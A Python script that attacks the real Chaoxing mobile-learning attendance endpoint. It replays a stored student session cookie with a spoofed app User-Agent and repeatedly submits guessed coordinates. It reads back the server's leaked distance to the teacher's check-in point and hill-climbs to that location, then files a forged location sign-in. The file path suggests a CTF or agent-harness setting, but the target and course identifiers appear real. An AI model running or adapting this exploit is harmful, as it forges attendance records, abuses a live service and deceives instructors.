# -*- coding: utf-8 -*-
"""★ 距离预言机爬坡定位（不依赖任何公式，只读服务端回的米数）：
反复「提交一个坐标 → 读回距离 → 沿梯度走」直到距离 < 阈值，再正式提交。
"""
import json, math, os, re, sys, time
import requests
os.chdir("/Users/xi/Documents/deepseek-harness/ctf/chaoxing")
UA_APP = ('Mozilla/5.0 (Linux; Android 13; SM-G975F Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) '
          'Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 (schild:26f6a66da55ad239903fba6f674e8c66) (device:SM-G975F) '
          'Language/zh_CN com.ssreader.ChaoXingStudy/ChaoXingStudy_3_6_2_android_phone_20230101')
MOBILE = "https://mobilelearn.chaoxing.com"
COURSE, CLAZZ, SUID = "269282723", "159926750", "[学生PUID]"
LOC_AID = "4000182047327"
TRUE_LAT, TRUE_LON = 30.71142640936642, 103.868397592583
sck = open("ck.txt", encoding="utf-8").read().strip()
S = requests.Session(); S.headers.update({"Cookie": sck, "User-Agent": UA_APP})
RE_M = re.compile(r"距教师指定签到地点([0-9.Ee+-]+)米")
SUCCESS = ("success", "success2", "您已签到过了")
calls = 0

def submit(lat, lon):
    global calls
    loc = json.dumps({"result": 1, "address": "成都市温江区 四川农业大学(成都校区)",
                      "longitude": round(lon, 12), "latitude": round(lat, 12)}, separators=(",", ":"))
    p = {"activeId": LOC_AID, "courseId": COURSE, "uid": SUID, "clientip": "", "useragent": "",
         "latitude": "-1", "longitude": "-1", "appType": "0", "fid": "0", "name": "",
         "location": loc, "locationResult": loc}
    r = S.get(MOBILE + "/pptSign/stuSignajax", params=p, timeout=25)
    calls += 1
    b = r.text.strip()
    m = RE_M.search(b)
    return b, (float(m.group(1)) if m else None)

def hav(a, b, c, d, R=6371000.0):
    p1, p2 = math.radians(a), math.radians(c)
    dp = math.radians(c - a); dl = math.radians(d - b)
    x = math.sin(dp/2)**2 + math.cos(p1)*math.cos(p2)*math.sin(dl/2)**2
    return 2*R*math.asin(math.sqrt(x))

out = {"aid": LOC_AID, "walk": []}
lat, lon = 30.70, 103.85
print("===== 距离预言机爬坡（起点 %.4f, %.4f）=====" % (lat, lon))
for it in range(10):
    b0, d0 = submit(lat, lon)
    ok = any(k in b0 for k in SUCCESS)
    print("  #%02d (%.8f, %.8f) -> %s" % (it, lat, lon, b0[:60]))
    out["walk"].append({"it": it, "lat": lat, "lon": lon, "body": b0[:80], "dist": d0})
    if ok:
        print("  [+] 成功/已签，停止")
        break
    if d0 is None:
        print("  [!] 没有距离数字，停止"); break
    dt = 0.0025                                   # ~278 m 纬度步长
    _, da = submit(lat + dt, lon)
    _, db = submit(lat, lon + dt)
    if da is None or db is None:
        print("  [!] 梯度探针无距离，停止"); break
    g_lat = (da - d0) / dt
    g_lon = (db - d0) / dt
    n2 = g_lat*g_lat + g_lon*g_lon
    if n2 == 0:
        print("  [!] 梯度为零，停止"); break
    s_lat = -0.85 * d0 * g_lat / n2
    s_lon = -0.85 * d0 * g_lon / n2
    # 单步位移上限（度），防跨太远
    cap = 0.02
    s_lat = max(-cap, min(cap, s_lat)); s_lon = max(-cap, min(cap, s_lon))
    lat += s_lat; lon += s_lon
    print("      d=%.1f 米，梯度(%.3f, %.3f) → 走 (%.5f, %.5f) 度" % (d0, g_lat, g_lon, s_lat, s_lon))
    time.sleep(0.3)

err = hav(lat, lon, TRUE_LAT, TRUE_LON)
print()
print("===== 结果 =====")
print("  收敛坐标 = (%.10f, %.10f)" % (lat, lon))
print("  与教师真值距离 = %.2f 米（真值 %.10f, %.10f）" % (err, TRUE_LAT, TRUE_LON))
print("  总提交次数 = %d" % calls)
out["solved"] = {"lat": lat, "lon": lon, "err_m": err, "calls": calls}

# 若还没签成，用收敛点正式提交一次
b, d = submit(lat, lon)
print("  最终提交 -> %s" % b[:70])
out["final"] = {"body": b[:90], "dist": d, "calls": calls}

json.dump(out, open("out/stu_oracle_walk.json", "w", encoding="utf-8"), ensure_ascii=False, indent=1)
print("[saved] out/stu_oracle_walk.json")
